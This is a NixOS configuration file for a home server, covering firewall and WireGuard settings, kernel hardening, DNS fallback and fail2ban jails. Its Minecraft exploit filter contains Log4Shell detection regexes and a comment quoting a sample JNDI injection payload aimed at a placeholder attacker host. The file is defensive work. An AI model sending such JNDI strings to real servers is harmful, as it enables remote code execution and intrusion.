{ config, ... }:

let
  inherit (config.serverConfig.network) localhost server;
in {
  # Access level guide - Where to expose your services:
  #
  # LAN access →  Add ports to allowedTCPPorts
  # VPN →  Add to interfaces."wg0" instead (VPN-only, more secure)
  # SSH tunnel →  Don't open any port, use SSH tunnel: ssh -L 8200:localhost:8200 user@server

  networking = {
    hostName = "server";

    firewall = {
      # LAN-accessible ports (if you trust your local network)
      # Note: Behind NAT router, not exposed to internet unless you port-forward
      # Add your services here if you trust LAN access
      allowedTCPPorts = [
        25565 # Minecraft
        443 # HTTPS (nginx reverse proxy for .local domains)
      ];
      allowedUDPPorts = [ 51820 ]; # WireGuard VPN

      # CRITICAL: Disable reverse path filtering for WireGuard
      # This prevents the firewall from blocking VPN traffic
      # "loose" mode allows packets from any interface to be forwarded
      checkReversePath = "loose";

      # Trust WireGuard interface completely (peers are already authenticated)
      # More paranoid setups could still apply firewall rules to VPN traffic
      trustedInterfaces = [ "wg0" ];

      # VPN-specific ports (in addition to general allowedTCPPorts above)
      interfaces."wg0" = {
        allowedTCPPorts = [
          53 # Pi-hole DNS
          8080 # Pi-hole web interface
          8001 # Restic backup server
          3030 # Grafana monitoring
          443 # HTTPS (nginx reverse proxy)
        ];
        allowedUDPPorts = [ 53 ]; # Pi-hole DNS

        # Restic backup server is VPN-only by default
        # To also allow LAN access, uncomment:
        # networking.firewall.interfaces."enp*".allowedTCPPorts = [ 8001 ];
      };
    };

    # Get IP address from router via DHCP (standard for home networks)
    useDHCP = true;

    # NAT for VPN - allows VPN clients to access internet through server
    nat = {
      enable = true;
      # IMPORTANT: Check your ethernet interface name with 'ip a' - may differ
      # Common names: eth0, eno1, enp3s0, enp5s0, etc.
      externalInterface = "enp5s0";
      internalInterfaces = [ "wg0" ];
    };

  };

  # Kernel network settings for VPN, performance, and security
  boot.kernel.sysctl = {
    # IP forwarding for VPN routing
    "net.ipv4.ip_forward" = 1;
    "net.ipv6.conf.all.forwarding" = 1;

    # Network performance tuning (improves throughput for file uploads, streaming, backups)
    "net.core.rmem_max" = 134217728; # 128MB receive buffer
    "net.core.wmem_max" = 134217728; # 128MB send buffer
    "net.ipv4.tcp_rmem" = "4096 87380 67108864"; # TCP receive buffer
    "net.ipv4.tcp_wmem" = "4096 65536 67108864"; # TCP send buffer

    # Network security hardening
    # Note: rp_filter managed by firewall.checkReversePath = "loose" for WireGuard
    "net.ipv4.tcp_syncookies" = 1; # SYN flood protection
    "net.ipv4.conf.all.accept_source_route" =
      0; # Prevent source routing attacks
    "net.ipv4.icmp_echo_ignore_broadcasts" = 1; # Ignore broadcast pings
    "net.ipv4.icmp_ignore_bogus_error_responses" = 1; # Ignore malformed ICMP
    "net.ipv4.conf.all.log_martians" = 1; # Log suspicious packets
    "net.ipv4.conf.default.log_martians" = 1;
    "net.ipv4.conf.all.accept_redirects" = 0; # Prevent ICMP redirect attacks
    "net.ipv4.conf.default.accept_redirects" = 0;
    "net.ipv4.conf.all.send_redirects" = 0; # Don't send ICMP redirects
    "net.ipv4.conf.default.send_redirects" = 0;

    # IPv6 hardening
    "net.ipv6.conf.all.accept_redirects" = 0;
    "net.ipv6.conf.default.accept_redirects" = 0;
    "net.ipv6.conf.all.accept_source_route" = 0;

    # Connection tracking (prevent table exhaustion with many containers)
    "net.netfilter.nf_conntrack_max" = 262144;
  };

  # Disable systemd-resolved DNS stub listener (conflicts with Pi-hole)
  # Pi-hole needs to bind to port 53
  services.resolved = {
    enable = true;
    dnssec = "false";
    # Fallback DNS when Pi-hole is unavailable
    domains = [ "~." ];
    fallbackDns = [
      "9.9.9.9" # Quad9 primary (filtered, DNSSEC)
      "149.112.112.112" # Quad9 secondary
      "2620:fe::fe" # Quad9 IPv6 primary
      "2620:fe::9" # Quad9 IPv6 secondary
    ];
    extraConfig = ''
      DNSStubListener=no
      DNS=9.9.9.9 149.112.112.112 2620:fe::fe 2620:fe::9
    '';
  };

  # fail2ban for additional protection
  services.fail2ban = {
    enable = true;
    maxretry = 3;
    ignoreIP = [
      localhost.network # Localhost
      server.vpnNetwork # WireGuard VPN clients
      server.lanNetwork # Your local network - can't ban yourself
    ];

    # Custom jails for enhanced protection
    jails = {
      # SSH brute-force protection (enhanced default)
      sshd = {
        settings = {
          enabled = true;
          port = "22";
          filter = "sshd";
          logpath = "/var/log/auth.log";
          maxretry = 3;
          findtime = 600; # 10 minutes
          bantime = 3600; # 1 hour
        };
      };

      # Minecraft server protection
      minecraft = {
        settings = {
          enabled = true;
          port = "25565";
          filter = "minecraft";
          logpath = "/mnt/ssd/minecraft/logs/latest.log";
          maxretry = 5; # More lenient for connection issues
          findtime = 300; # 5 minutes
          bantime = 1800; # 30 minutes
        };
      };

      # Modded Minecraft server protection
      minecraft-modded = {
        settings = {
          enabled = true;
          port = "25566";
          filter = "minecraft";
          logpath = "/mnt/ssd/minecraft-modded/logs/latest.log";
          maxretry = 5;
          findtime = 300; # 5 minutes
          bantime = 1800; # 30 minutes
        };
      };

      # Minecraft exploit detection (Log4Shell CVE-2021-44228, JNDI injection)
      # While patched in Minecraft 1.18.1+, attackers still scan for vulnerable servers
      # Defense-in-depth protection in case old server versions are accidentally run
      minecraft-exploit = {
        settings = {
          enabled = true;
          port = "25565,25566";
          filter = "minecraft-exploit";
          logpath = "/mnt/ssd/minecraft/logs/latest.log";
          maxretry = 1; # Zero tolerance for exploits
          findtime = 86400; # 24 hours
          bantime = -1; # Permanent ban
        };
      };

      # Authelia Friend (Podman) - Authentication brute force protection
      authelia-friend-podman = {
        settings = {
          enabled = true;
          port = "http,https";
          filter = "authelia-friend";
          logpath = "/mnt/ssd/immich_friend/authelia/authelia.log";
          maxretry = 5; # Allow some legitimate failures
          findtime = 600; # 10 minutes
          bantime = 10800; # 3 hours
        };
      };

      # Authelia Friend (K3s) - Authentication brute force protection
      # Note: Logs may be in different location when using k3s
      authelia-friend-k3s = {
        settings = {
          enabled = true;
          port = "http,https";
          filter = "authelia-friend";
          logpath = "/var/log/containers/authelia-*.log";
          maxretry = 5;
          findtime = 600; # 10 minutes
          bantime = 10800; # 3 hours
        };
      };
    };
  };

  # Define fail2ban filters for Minecraft
  environment.etc = {
    # Main Minecraft filter - detects non-whitelisted connections and spam
    "fail2ban/filter.d/minecraft.conf".text = ''
      [Definition]
      # Minecraft log format uses [HH:MM:SS] timestamp
      datepattern = ^\[%%H:%%M:%%S\]

      # Match non-whitelisted connection attempts
      # Example: "Disconnecting /192.168.1.100:54321: You are not white-listed"
      failregex = ^.*Disconnecting \S+ \(/<HOST>:\d+\): You are not white-listed$
                  ^.*Disconnecting .*\(/<HOST>:\d+\)
                  ^.*\[Server thread/INFO\]: .*\[/<HOST>:\d+\] logged in

      ignoreregex =
    '';

    # Exploit filter - detects Log4Shell and similar attacks
    "fail2ban/filter.d/minecraft-exploit.conf".text = ''
      [Definition]
      datepattern = ^\[%%H:%%M:%%S\]

      # Detect JNDI injection attempts (Log4Shell CVE-2021-44228)
      # Match patterns like: ''${jndi:ldap://attacker.com/...}
      failregex = ^.*\$\{jndi:.*<HOST>
                  ^.*<HOST>.*\$\{jndi:
                  ^.*java\.rmi\..*<HOST>

      ignoreregex =
    '';

    # Authelia filter - detects failed authentication attempts
    "fail2ban/filter.d/authelia-friend.conf".text = ''
      [Definition]
      # Authelia log format: time="..." level=error msg="..." method=POST path=/api/firstfactor remote_ip=X.X.X.X

      # Match failed 1FA (username/password) attempts
      failregex = ^.*level=error.*Unsuccessful 1FA authentication attempt.*remote_ip="?<HOST>"?.*$
                  ^.*level=error.*Authentication attempt failed.*remote_ip="?<HOST>"?.*$
                  ^.*level=error.*Invalid credentials.*remote_ip="?<HOST>"?.*$
                  ^.*level=error.*failed authentication attempt.*remote_ip=<HOST>.*$

      # Ignore successful authentications
      ignoreregex = ^.*level=info.*Successful.*$
                    ^.*level=debug.*$
    '';
  };
}
